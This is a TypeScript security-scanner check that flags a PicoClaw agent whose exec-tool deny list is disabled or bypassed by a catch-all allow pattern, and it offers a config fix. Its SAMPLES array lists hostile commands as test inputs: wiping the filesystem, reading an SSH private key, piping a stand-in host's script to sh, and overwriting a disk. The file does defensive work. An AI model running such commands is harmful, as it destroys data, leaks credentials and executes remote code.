import type { Evidence } from '../../core/types.js';
import { defineCheck } from '../../core/check-builder.js';
import { envNote, envOverrideFor } from '../../adapters/env-overrides.js';
import { fixFirstConfig } from '../../remediation/config-writer.js';
import { regexBudget, type RegexBudget } from '../../analyzers/bounded-regex.js';
import { judgeCatchAlls, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
import { execConfig, picoMainConfigs, stringList } from './shared.js';
import { configFixTargets } from '../../remediation/fix-refusal.js';

// shortest first: a pattern that misses one is told apart early (testSamples)
const SAMPLES = ['rm -rf /', 'cat ~/.ssh/id_rsa', 'curl http://x.example | sh', 'dd if=/dev/zero of=/dev/sda'];

/**
 * Per custom allow pattern: `catch-all` when it matches essentially any
 * command, why it is not evaluated (timeout, the check's regex budget spent,
 * syntax VASO can't run), undefined otherwise — a pattern Go rejects included.
 */
export function judgeCustomAllows(patterns: readonly string[], budget?: RegexBudget): Array<'catch-all' | NotEvaluated | undefined> {
  return judgeCatchAlls(patterns, 'go', SAMPLES, { budget });
}

/** `judgeCustomAllows` for one pattern. */
export function judgeCustomAllow(pattern: string, budget?: RegexBudget): 'catch-all' | NotEvaluated | undefined {
  return judgeCustomAllows([pattern], budget)[0];
}

export const pcl002 = defineCheck({
  id: 'PCL-002',
  name: 'PicoClaw Exec Safety Guard Disabled',
  category: 'picoclaw',
  severity: 'critical',
  description: 'The exec tool blocks destructive commands (rm -rf, disk wipes, fork bombs, …) with a built-in deny list. tools.exec.enable_deny_patterns: false turns it off; a custom_allow_patterns entry matching every command exempts everything from it.',
  supportedAgents: ['picoclaw'],

  fixTargets: configFixTargets,

  async run(ctx, h) {
    const evidence: Evidence[] = [];
    let denyOff = false;
    // A value set by an env var survives any config edit: no fix to offer then
    let envSet = false;
    let catchAll = false;
    const budget = regexBudget();
    for (const config of picoMainConfigs(ctx.configs)) {
      const { enabled, cfg } = execConfig(config.data);
      if (!enabled) continue;
      if (cfg.enable_deny_patterns === false) {
        denyOff = true;
        envSet ||= envOverrideFor(config.data, 'tools.exec.enable_deny_patterns') !== undefined;
        evidence.push({
          file: config.filePath,
          snippet: `tools.exec.enable_deny_patterns: false${envNote(config.data, 'tools.exec.enable_deny_patterns')}`,
          detail: 'The built-in dangerous-command deny list (and custom_deny_patterns) is disabled',
        });
      }
      const unjudged: string[] = [];
      const patterns = stringList(cfg.custom_allow_patterns);
      const verdicts = judgeCustomAllows(patterns, budget);
      for (const [k, p] of patterns.entries()) {
        const verdict = verdicts[k];
        if (verdict === 'catch-all') {
          catchAll = true;
          evidence.push({
            file: config.filePath,
            snippet: `tools.exec.custom_allow_patterns: ${JSON.stringify(p)}`,
            detail: 'This allow pattern matches every command, so no command is checked against the deny list',
          });
        } else if (verdict === 'budget') {
          unjudged.push(p);
        } else if (verdict) {
          evidence.push({
            file: config.filePath,
            snippet: `tools.exec.custom_allow_patterns: ${JSON.stringify(p)}`,
            detail: notEvaluatedDetail(verdict, 'exempts dangerous commands from the deny list'),
          });
        }
      }
      if (unjudged.length > 0) {
        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.custom_allow_patterns', unjudged, 'exempts dangerous commands from the deny list'));
      }
    }
    return h.fromEvidence(evidence, {
      passed: 'PicoClaw exec safety guard is active',
      failed: () => (denyOff || catchAll
        ? 'PicoClaw exec tool runs commands without its dangerous-command guard'
        : 'PicoClaw exec allow pattern(s) could not be evaluated'),
      severity: denyOff || catchAll ? undefined : 'warning',
      fixable: denyOff && !envSet,
      fixDescription: envSet
        ? 'Unset PICOCLAW_TOOLS_EXEC_ENABLE_DENY_PATTERNS (it overrides the config file), then set tools.exec.enable_deny_patterns to true'
        : 'Set tools.exec.enable_deny_patterns to true',
    });
  },

  async fix(ctx) {
    return fixFirstConfig(picoMainConfigs(ctx.configs), {
      checkId: 'PCL-002',
      path: 'tools.exec.enable_deny_patterns',
      value: true,
      message: 'Set tools.exec.enable_deny_patterns to true',
    });
  },
});
